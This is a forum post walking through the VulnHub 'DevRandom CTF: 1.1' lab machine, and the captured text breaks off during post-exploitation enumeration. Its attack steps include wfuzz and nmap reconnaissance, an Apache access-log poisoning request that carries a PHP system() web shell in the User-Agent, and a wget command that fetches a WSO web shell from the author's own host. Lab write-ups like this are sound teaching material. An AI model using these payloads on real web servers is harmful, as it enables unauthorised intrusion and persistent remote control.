<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>(VulnHub) DevRandom CTF: 1.1 | WriteUp - CTF - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Hello guys, 
This is gonna be my writeup for ( DevRandom CTF: 1.1 ) from VulnHub. 
For challengers and CTF players you can try it before reading my solution. 
P.S:both video and text writeup are included. 
&lt;details&gt;&lt;summary&gt;Summary&lt;/summary&gt;https:/&amp;hellip;&lt;/details&gt;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="20195.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;(VulnHub) DevRandom CTF: 1.1 | WriteUp&#39;" href="20195.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://0x00sec.org/t/vulnhub-devrandom-ctf-1-1-writeup/20195" />
<meta name="twitter:url" content="https://0x00sec.org/t/vulnhub-devrandom-ctf-1-1-writeup/20195" />
<meta property="og:title" content="(VulnHub) DevRandom CTF: 1.1 | WriteUp" />
<meta name="twitter:title" content="(VulnHub) DevRandom CTF: 1.1 | WriteUp" />
<meta property="og:description" content="Hello guys,  This is gonna be my writeup for ( DevRandom CTF: 1.1 ) from VulnHub.  For challengers and CTF players you can try it before reading my solution.  P.S:both video and text writeup are included.  &lt;details&gt;&lt;summary&gt;Summary&lt;/summary&gt;https://www.youtube.com/watch?v=7d2shrQA_bs  http://192.168.1.148/  the source :  &lt;center&gt;&lt;br&gt; This Page is Closed!&lt;br&gt;&lt;img src=&quot;seizure.jpg&quot;&gt;&lt;br&gt;&lt;/center&gt;  so we have only one image … let’s download it and before that let’s run nmap and dir...&lt;/details&gt;" />
<meta name="twitter:description" content="Hello guys,  This is gonna be my writeup for ( DevRandom CTF: 1.1 ) from VulnHub.  For challengers and CTF players you can try it before reading my solution.  P.S:both video and text writeup are included.  &lt;details&gt;&lt;summary&gt;Summary&lt;/summary&gt;https://www.youtube.com/watch?v=7d2shrQA_bs  http://192.168.1.148/  the source :  &lt;center&gt;&lt;br&gt; This Page is Closed!&lt;br&gt;&lt;img src=&quot;seizure.jpg&quot;&gt;&lt;br&gt;&lt;/center&gt;  so we have only one image … let’s download it and before that let’s run nmap and dir...&lt;/details&gt;" />
<meta property="og:article:section" content="CTF" />
<meta property="og:article:section:color" content="F1592A" />
<meta property="og:article:tag" content="ctf" />
<meta property="og:article:tag" content="challenge" />
<meta property="og:article:tag" content="writeup" />
<meta property="og:article:tag" content="hacking" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="13 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="4 ❤" />
<meta property="article:published_time" content="2020-04-01T18:58:01+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="20195.html">(VulnHub) DevRandom CTF: 1.1 | WriteUp</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/ctf/55.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F1592A"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">CTF</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/ctf.html" class="discourse-tag" rel="tag">ctf</a>,
<a href="../../tag/challenge.html" class="discourse-tag" rel="tag">challenge</a>,
<a href="../../tag/writeup.html" class="discourse-tag" rel="tag">writeup</a>,
<a href="../../tag/hacking.html" class="discourse-tag" rel="tag">hacking</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="(VulnHub) DevRandom CTF: 1.1 | WriteUp">
<meta itemprop="articleSection" content="CTF">
<meta itemprop="keywords" content="ctf, challenge, writeup, hacking">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/DamaneDz"><span itemprop="name">DamaneDz</span></a>
(DamaneDz)
</span>
<link itemprop="mainEntityOfPage" href="20195.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-04-01T18:58:01Z" class="post-time">
April 1, 2020, 6:58pm
</time>
<meta itemprop="dateModified" content="2020-04-01T18:58:01Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>Hello guys,<br>
This is gonna be my writeup for ( DevRandom CTF: 1.1 ) from <a href="https://www.vulnhub.com/entry/devrandom-ctf-11,450/" rel="nofollow noopener">VulnHub</a>.<br>
For challengers and CTF players you can try it before reading my solution.<br>
P.S:both video and text writeup are included.</p>
<details>
<summary>
Summary</summary>
<p><a href="https://www.youtube.com/watch?v=7d2shrQA_bs" rel="nofollow noopener">https://www.youtube.com/watch?v=7d2shrQA_bs</a></p>
<p><code>http://192.168.1.148/</code></p>
<p>the source :</p>
<p><code>&lt;center&gt;&lt;br&gt; This Page is Closed!&lt;br&gt;&lt;img src="seizure.jpg"&gt;&lt;br&gt;&lt;/center&gt;</code></p>
<p>so we have only one image … let’s download it and before that let’s run nmap and dirbuster</p>
<p>I prefer using wfuzz instead of dirbuster or gobuster or whatever nowdays tools !</p>
<p>and for the image we can use exiftool and mediainfo (for windows)</p>
<p>to get any hidden informations or strings</p>
<pre><code>&gt; exiftool seizure.jpg
ExifTool Version Number         : 10.61
File Name                       : seizure.jpg
Directory                       : .
File Size                       : 181 kB
File Modification Date/Time     : 2020:03:30 13:35:14+01:00
File Access Date/Time           : 2020:03:30 13:35:14+01:00
File Creation Date/Time         : 2020:03:30 13:35:13+01:00
File Permissions                : rw-rw-rw-
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1294
Image Height                    : 736
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1294x736
Megapixels                      : 0.952
-- press RETURN --
</code></pre>
<p>nothing looks interesting</p>
<p>nothing in strings too !</p>
<p>so let’s go back to our wfuzz run</p>
<pre><code>&gt; wfuzz -c -u "http://192.168.1.148/FUZZ" -w raft-large-files.txt --hc 404,500,403
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.148/FUZZ
Total requests: 37042

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000029:   200        1 L      6 W      74 Ch       "wp-login.php"
000000123:   200        98 L     838 W    7368 Ch     "readme.html"
000000199:   200        385 L    3179 W   19935 Ch    "license.txt"
000000241:   200        6 L      8 W      86 Ch       "robots.txt"
000000256:   200        1 L      6 W      74 Ch       "wp-config.php"
000000290:   200        1 L      6 W      74 Ch       "wp-trackback.php"
000000372:   200        1 L      6 W      74 Ch       "."
000000392:   200        1 L      6 W      74 Ch       "wp-mail.php"
000000406:   200        1 L      6 W      74 Ch       "wp-cron.php"
000000441:   200        1 L      6 W      74 Ch       "wp-blog-header.php"
000000455:   200        1 L      6 W      74 Ch       "wp-links-opml.php"
000000001:   200        1 L      6 W      74 Ch       "index.php"
000000831:   200        1 L      6 W      74 Ch       "wp-load.php"
000001058:   200        1081 L   13015    107376 Ch   "log.php"
                                 W
000001066:   200        1 L      6 W      74 Ch       "wp-signup.php"
000001500:   302        0 L      0 W      0 Ch        "wp-activate.php"
000025413:   400        8 L      27 W     226 Ch      "directory                e.g."

000034083:   200        2 L      1 W      38 Ch       "secret.php"

Total time: 31.41398
Processed Requests: 37042
Filtered Requests: 37024
Requests/sec.: 1179.156
</code></pre>
<p>it’s looks like we have a wordpress CMS but not working correctly …</p>
<p>Our Wappalyzer addon confirm that we are in a WordPress</p>
<blockquote>
<p>CMS<br>
WordPress</p>
</blockquote>
<p>in the source code of the page “<a href="http://192.168.1.148/?include=info" rel="nofollow noopener">http://192.168.1.148/?include=info</a>”</p>
<p>we have a weird IP “192.168.1.214” that why our wordpress looks missed up !</p>
<p>when they installed the wordpress on the VM the IP was 192.168.1.214 and ours 192.168.1.148</p>
<p>anyway let’s continue …</p>
<p>for many files we have the same number of words “6 W” means let’s ignore these files …</p>
<p>we have a kind of more words in this file</p>
<p><code>000001058: 200 1081 L 13015 107376 Ch "log.php"</code></p>
<p>let’s give it a visit</p>
<p>OOoh we have a kind of access log files !</p>
<blockquote>
<p>view acces.log file : /var/www/html/access.log</p>
</blockquote>
<p>an access log is where the apache saves the visitors informations … let’s detail a value</p>
<p><code>192.168.1.33 - - [30/Mar/2020:07:26:27 -0500] "GET / HTTP/1.1" 200 317 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0"</code></p>
<p>we have first the IP address of the visitor !</p>
<p>and then the date</p>
<p>the request method GET</p>
<p>the visited file or folder</p>
<p>the response code and finally the browser user agent</p>
<p>So in Local file Include exploitation we always go back to the access log so we can inject some php codes and then run its</p>
<p>let’s try to inject something and before that let’s see our nmap scan …</p>
<pre><code>&gt; nmap -sC -sV 192.168.1.148 --unprivileged
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-30 13:33 W. Central Africa Standard Time
Strange read error from 192.168.1.148 (203 - 'Unknown error')
Strange read error from 192.168.1.148 (203 - 'Unknown error')
Strange read error from 192.168.1.148 (203 - 'Unknown error')
Strange read error from 192.168.1.148 (203 - 'Unknown error')
Strange read error from 192.168.1.148 (203 - 'Unknown error')
Nmap scan report for 192.168.1.148
Host is up (1.0s latency).
Not shown: 993 closed ports
PORT      STATE    SERVICE       VERSION
22/tcp    open     ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 83:e5:a1:51:b1:f6:98:d3:19:e7:59:10:f7:f4:e8:5e (RSA)
|   256 b2:a6:79:c3:ad:2f:ba:cc:02:b3:42:0d:a2:a3:9e:60 (ECDSA)
|_  256 ec:1f:d4:29:9f:a5:ae:ca:93:f4:a8:6b:fd:61:44:45 (ED25519)
80/tcp    open     http          Apache httpd
| http-robots.txt: 3 disallowed entries
|_/wp-admin/ /wp-login.php /?include=info
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
340/tcp   filtered unknown
512/tcp   filtered exec
2105/tcp  filtered eklogin
5120/tcp  filtered barracuda-bbs
18040/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 266.23 seconds
</code></pre>
<p>we have to known open ports as we saw in angry ip later and these ports are 22 and 80</p>
<pre><code>340/tcp   filtered unknown
512/tcp   filtered exec
2105/tcp  filtered eklogin
5120/tcp  filtered barracuda-bbs
18040/tcp filtered unknown
</code></pre>
<p>and for these ports I swear you guys its the first time I see them but they looks kind of filtered let’s test them via netcat</p>
<p>no responses maybe some false results …</p>
<p>that doesn’t matter at least we have a webpage and a access log file viewer <img src="../../images/emoji/twitter/stuck_out_tongue.png%3Fv=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
<p>let’s inject our php code via burpsuite</p>
<p>so the sent request was:</p>
<pre><code>GET / HTTP/1.1
Host: 192.168.1.148
User-Agent: x00xTeam !
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
</code></pre>
<p>the response was <strong>HTTP/1.1 200 OK</strong> which means everything going right ! let’s refresh our log.php file and see</p>
<p>I already refresh it before i wrote the sentence above</p>
<p><code>192.168.1.33 - - [30/Mar/2020:07:51:41 -0500] "GET / HTTP/1.1" 200 280 "-" "x00xTeam !"</code></p>
<p>so we have our new useragent … let’s inject some php codes and see if we are able to run it</p>
<pre><code>GET / HTTP/1.1
Host: 192.168.1.148
User-Agent: &lt;?php system($_GET['x']);?&gt;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
</code></pre>
<p>am gonna inject a system function that need a GET request to run so let’s do that</p>
<p>and yes we are able to run PHP codes <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<pre><code># ls -la :
total 424

drwxr-xr-x  6 wordpressftp www-data   4096 Mar 23 14:13 .

drwxr-x---  4 wordpressftp www-data   4096 Mar 22 08:25 ..

-rw-r--r--  1 wordpressftp www-data    199 Mar 19 16:17 .htaccess

-rw-r--r--  1 wordpressftp www-data    420 Nov 30  2017 index.php

-rw-r--r--  1 wordpressftp www-data  19935 Jan  1  2019 license.txt

-rw-r--r--  1 wordpressftp www-data    259 Mar 23 14:13 log.php

-rw-r--r--  1 wordpressftp www-data   7368 Sep  2  2019 readme.html

-rw-r--r--  1 wordpressftp www-data     86 Mar 18 21:01 robots.txt

drwxr-xr-x  2 wordpressftp www-data   4096 Mar 22 08:37 secret

-rw-r--r--  1 wordpressftp www-data    177 Mar 19 16:43 secret.php

-rw-r--r--  1 wordpressftp www-data 185479 Mar 19 15:53 seizure.jpg

-rw-r--r--  1 wordpressftp www-data   6939 Sep  2  2019 wp-activate.php

drwxr-xr-x  9 wordpressftp www-data   4096 Jan 12 05:00 wp-admin

-rw-r--r--  1 wordpressftp www-data    369 Nov 30  2017 wp-blog-header.php

-rw-r--r--  1 wordpressftp www-data   2283 Jan 20  2019 wp-comments-post.php

-rwxrwx---  1 wordpressftp www-data   2898 Jan  7  2019 wp-config-sample.php

-rw-r--r--  1 wordpressftp www-data   3102 Mar 18 20:02 wp-config.php

drwxrwx---  7 wordpressftp www-data   4096 Mar 19 15:20 wp-content

-rw-r--r--  1 wordpressftp www-data   3955 Oct 10 17:52 wp-cron.php

drwxr-xr-x 20 wordpressftp www-data  12288 Jan 12 05:00 wp-includes

-rw-r--r--  1 wordpressftp www-data   2504 Sep  2  2019 wp-links-opml.php

-rw-r--r--  1 wordpressftp www-data   3326 Sep  2  2019 wp-load.php

-rw-r--r--  1 wordpressftp www-data  47597 Dec  9 07:30 wp-login.php

-rw-r--r--  1 wordpressftp www-data   8483 Sep  2  2019 wp-mail.php

-rw-r--r--  1 wordpressftp www-data  19120 Oct 15 10:37 wp-settings.php

-rw-r--r--  1 wordpressftp www-data  31112 Sep  2  2019 wp-signup.php

-rw-r--r--  1 wordpressftp www-data   4764 Nov 30  2017 wp-trackback.php

-rw-r--r--  1 wordpressftp www-data   3150 Jul  1  2019 xmlrpc.php.old
</code></pre>
<p>let’s run some commands to know more about our Box</p>
<pre><code># id :
uid=33(www-data) gid=33(www-data) groups=33(www-data)
# pwd :
/var/www/html/wordpress/
</code></pre>
<p>without taking time in commands let’s upload our php shell so will do that directly</p>
<p>first we need to find writable folders in the current dir</p>
<p><code>find /var/www/html/wordpress/ -type d -writable -ls</code></p>
<p>here is our writable directories …</p>
<pre><code>"   656143      4 drwxrwx---   7 wordpressftp www-data     4096 Mar 19 15:20 /var/www/html/wordpress/wp-content
   656144      4 drwxrwx---   4 wordpressftp www-data     4096 Mar 19 04:59 /var/www/html/wordpress/wp-content/plugins
   656435      4 drwxrwx---   4 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/languages
   656445      4 drwxrwx---   2 wordpressftp www-data     4096 Mar 18 20:48 /var/www/html/wordpress/wp-content/languages/plugins
   656448      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/languages/themes
   656177      4 drwxrwx---   5 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes
   656250      4 drwxrwx---   5 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen
   656297      4 drwxrwx---   5 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/assets
   656306      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/assets/css
   656313      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/assets/images
   656298      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/assets/js
   656284      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/inc
   656258      4 drwxrwx---   7 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/template-parts
   656268      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/template-parts/post
   656264      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/template-parts/page
   656262      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/template-parts/navigation
   656259      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/template-parts/footer
   656276      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/template-parts/header
   656319      4 drwxrwx---   8 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen
   656362      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/inc
   656334      4 drwxrwx---   6 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts
   656337      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/post
   656340      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/content
   656335      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/footer
   656346      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/header
   656327      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/js
   656322      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/fonts
   656377      4 drwxrwx---  13 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass
   656420      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/mixins
   656423      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/variables-site
   656416      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/modules
   656388      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/elements
   656392      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/navigation
   656378      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/media
   656399      4 drwxrwx---   6 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site
   656403      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/primary
   656407      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/secondary
   656400      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/footer
   656409      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/header
   656412      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/forms
   656384      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/typography
   656431      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/layout
   656382      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/blocks
   656356      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/classes
   656178      4 drwxrwx---   7 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty
   656222      4 drwxrwx---   6 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/assets
   656235      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/assets/css
   656240      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/assets/images
   656227      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/assets/js
   656223      4 drwxrwx---   3 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/assets/fonts
   656224      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/assets/fonts/inter
   656208      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/inc
   656185      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/template-parts
   656218      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/templates
   656198      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/classes
   655416      4 drwxrwx---   3 www-data     www-data     4096 Mar 18 20:03 /var/www/html/wordpress/wp-content/uploads
   657692      4 drwxrwx---   3 www-data     www-data     4096 Mar 18 20:03 /var/www/html/wordpress/wp-content/uploads/2020
   657693      4 drwxrwx---   2 www-data     www-data     4096 Mar 19 07:04 /var/www/html/wordpress/wp-content/uploads/2020/03
</code></pre>
<p>let’s upload it inside this folder</p>
<p><code>/var/www/html/wordpress/wp-content</code></p>
<p>the command:</p>
<p><code>cd /var/www/html/wordpress/wp-content/;wget http://192.168.1.33:8080/dz_wso.php;ls -la</code></p>
<p>and we are in</p>
<p><code>http://192.168.1.148/wp-content/dz_wso.php</code></p>
<p>I like using this shell it facilate me many things and I always prefer interfaces and windows …</p>
<p>so let’s get the max informations we can take from the server we have a long way to the root</p>
<p><code>Linux lucifer 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64</code></p>
<pre><code>$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.9 103976 10088 ?        Ss   07:25   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    07:25   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    07:25   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    07:25   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        I    07:25   0:00 [rcu_bh]
root        12  0.0  0.0      0     0 ?        S    07:25   0:00 [migration/0]
